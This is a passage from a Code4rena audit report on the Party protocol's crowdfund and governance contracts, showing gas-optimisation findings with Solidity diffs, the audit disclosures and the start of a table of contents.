href=\"#g-01-use-maxtotalcontributations_-memory-variable-instead-of-maxtotalcontributions\" aria-label=\"g 01 use maxtotalcontributations_ memory variable instead of maxtotalcontributions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Use <code>maxTotalContributations_</code> memory variable instead of <code>maxTotalContributions</code></h2>\n<p><code>maxTotalContributions</code> has already been saved to the <code>maxTotalContributions_</code> memory variable.<br>\nIt’s cheaper to read from memory than from storage.  </p>\n<p>Gas saved: 124 Gas per tx</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4392655..886c09c 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -212,7 +212,7 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             _finalize(maxTotalContributions_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Refund excess contribution.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint96 refundAmount = newTotalContributions - maxTotalContributions;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint96 refundAmount = newTotalContributions - maxTotalContributions_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (refundAmount &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 amount -= refundAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 payable(msg.sender).transferEth(refundAmount);</span></span></span></code></pre>\n<h2 id=\"g-02-no-need-to-cache-fundingsplitrecipient-in-memory-variable\" style=\"position:relative;\"><a href=\"#g-02-no-need-to-cache-fundingsplitrecipient-in-memory-variable\" aria-label=\"g 02 no need to cache fundingsplitrecipient in memory variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] No need to cache <code>fundingSplitRecipient</code> in memory variable</h2>\n<p><code>fundingSplitRecipient</code> is only used once. So it is not beneficial to cache it in a memory variable.  </p>\n<p>Gas saved: Negligible but code is simplified</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ETHCrowdfundBase.sol b/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 4392655..17af949 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ETHCrowdfundBase.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -222,9 +222,8 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Subtract fee from contribution amount if applicable.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address payable fundingSplitRecipient_ = fundingSplitRecipient;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint16 fundingSplitBps_ = fundingSplitBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (fundingSplitRecipient_ != address(0) &amp;&amp; fundingSplitBps_ &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (fundingSplitRecipient != address(0) &amp;&amp; fundingSplitBps_ &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             uint96 feeAmount = (amount * fundingSplitBps_) / 1e4;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             amount -= feeAmount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -237,9 +236,8 @@ contract ETHCrowdfundBase is Implementation {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         amount = (votingPower * 1e4) / exchangeRateBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Add back fee to contribution amount if applicable.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        address payable fundingSplitRecipient_ = fundingSplitRecipient;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint16 fundingSplitBps_ = fundingSplitBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (fundingSplitRecipient_ != address(0) &amp;&amp; fundingSplitBps_ &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (fundingSplitRecipient != address(0) &amp;&amp; fundingSplitBps_ &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             amount = (amount * 1e4) / (1e4 - fundingSplitBps_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span></code></pre>\n<h2 id=\"g-03-cache-party-in-memory-variable\" style=\"position:relative;\"><a href=\"#g-03-cache-party-in-memory-variable\" aria-label=\"g 03 cache party in memory variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Cache <code>party</code> in memory variable</h2>\n<p><code>party</code> is used multiple times so it can be cached in a memory variable.</p>\n<p>Gas saved: 149 per tx</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/InitialETHCrowdfund.sol b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 8ab3b5c..159e30a 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/InitialETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -325,15 +325,16 @@ contract InitialETHCrowdfund is ETHCrowdfundBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Get amount to refund.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        uint96 votingPower = party.votingPowerByTokenId(tokenId).safeCastUint256ToUint96();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        Party party_ = party;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        uint96 votingPower = party_.votingPowerByTokenId(tokenId).safeCastUint256ToUint96();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         amount = _calculateRefundAmount(votingPower);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (amount &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Get contributor to refund.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            address payable contributor = payable(party.ownerOf(tokenId));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            address payable contributor = payable(party_.ownerOf(tokenId));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Burn contributor&#39;s party card.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            party.burn(tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            party_.burn(tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Refund contributor.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             contributor.transferEth(amount);</span></span></span></code></pre>\n<h2 id=\"g-04-save-votingpowerbycardi-in-memory-variable\" style=\"position:relative;\"><a href=\"#g-04-save-votingpowerbycardi-in-memory-variable\" aria-label=\"g 04 save votingpowerbycardi in memory variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Save <code>votingPowerByCard[i]</code> in memory variable</h2>\n<p>Gas saved: 1365 per tx</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/crowdfund/ReraiseETHCrowdfund.sol b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 580623d..68ccf4e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/crowdfund/ReraiseETHCrowdfund.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -352,14 +352,15 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint96 minContribution_ = minContribution;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint96 maxContribution_ = maxContribution;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i; i &lt; votingPowerByCard.length; ++i) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (votingPowerByCard[i] == 0) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint96 vp = votingPowerByCard[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (vp == 0) continue;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Check that the contribution equivalent of voting power is within</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // contribution range. This is done so parties may use the minimum</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // and maximum contribution values to limit the voting power of each</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // card (e.g. a party desiring a &quot;1 card = 1 vote&quot;-like governance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // system where each card has equal voting power).</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint96 contribution = (votingPowerByCard[i] * 1e4) / exchangeRateBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint96 contribution = (vp * 1e4) / exchangeRateBps;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             if (contribution &lt; minContribution_) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 revert BelowMinimumContributionsError(contribution, minContribution_);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -371,9 +372,9 @@ contract ReraiseETHCrowdfund is ETHCrowdfundBase, CrowdfundNFT {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             votingPower -= votingPowerByCard[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // Mint contributor a new party card.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            uint256 tokenId = party.mint(contributor, votingPowerByCard[i], delegate);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256 tokenId = party.mint(contributor, vp, delegate);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            emit Claimed(contributor, tokenId, votingPowerByCard[i]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            emit Claimed(contributor, tokenId, vp);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Requires that all voting power is claimed because the contributor is</span></span></span></code></pre>\n<h2 id=\"g-05-use-mintedvotingpower_-instead-of-mintedvotingpower\" style=\"position:relative;\"><a href=\"#g-05-use-mintedvotingpower_-instead-of-mintedvotingpower\" aria-label=\"g 05 use mintedvotingpower_ instead of mintedvotingpower permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Use <code>mintedVotingPower_</code> instead of <code>mintedVotingPower</code></h2>\n<p>Gas saved: 114 per tx per instance</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"102\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/contracts/party/PartyGovernanceNFT.sol b/contracts/party/PartyGovernanceNFT.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 9ccfa1f..c6c3d14 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/contracts/party/PartyGovernanceNFT.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/contracts/party/PartyGovernanceNFT.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -149,7 +149,7 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Update state.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         tokenId = tokenCount = tokenCount_ + 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        mintedVotingPower += votingPower_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mintedVotingPower = mintedVotingPower_ + votingPower_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         votingPowerByTokenId[tokenId] = votingPower_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Use delegate from party over the one set during crowdfund.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -181,7 +181,7 @@ contract PartyGovernanceNFT is PartyGovernance, ERC721, IERC2981 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // Update state.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        mintedVotingPower += votingPower_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        mintedVotingPower = mintedVotingPower_ + votingPower_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         votingPowerByTokenId[tokenId] += votingPower_;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         _adjustVotingPower(ownerOf(tokenId), votingPower_.safeCastUint96ToInt192(), address(0));</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-party-findings/issues/23#issuecomment-1513577421\">0xble (Party) confirmed</a></strong></p>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-8\">High Risk Findings (8)</a></p>\n<ul>\n<li><a href=\"#h-01-self-delgated-users-can-have-their-delegation-unknowingly-hijacked-during-crowdfunding\">[H-01] Self-delgated users can have their delegation unknowingly hijacked during crowdfunding</a></li>\n<li><a href=\"#h-02-an-attacker-can-contribute-to-the-eth-crowdfund-using-a-flash-loan-and-control-the-party-as-he-likes\">[H-02] An attacker can contribute to the ETH crowdfund using a flash loan and control the party as he likes</a></li>\n<li><a href=\"#h-03-users-wouldnt-refund-from-the-lost-eth-crowdfunds-due-to-the-lack-of-eth\">[H-03] Users wouldn’t refund from the lost ETH crowdfunds due to the lack of ETH</a></li>\n<li><a href=\"#h-04-reraiseethcrowdfundsol-multiple-scenarios-how-pending-votes-might-not-be-claimable-which-is-a-complete-loss-of-funds-for-a-user\">[H-04] <code>ReraiseETHCrowdfund.sol</code>: Multiple scenarios how pending votes might not be claimable which is a complete loss of funds for a user</a></li>\n<li><a href=\"#h-05-reraiseethcrowdfundsol-party-card-transfer-can-be-front-run-by-claiming-pending-voting-power-which-results-in-a-loss-of-the-voting-power\">[H-05] <code>ReraiseETHCrowdfund.sol</code>: party card transfer can be front-run by claiming pending voting power which results in a loss of the voting power</a></li>\n<li><a href=\"#h-06-ethcrowdfundbasesol-totalvotingpower-is-increased-too-much-in-the-_finalize-function\">[H-06] <code>ETHCrowdfundBase.sol</code>: <code>totalVotingPower</code> is increased too much in the <code>_finalize</code> function</a></li>\n<li><a 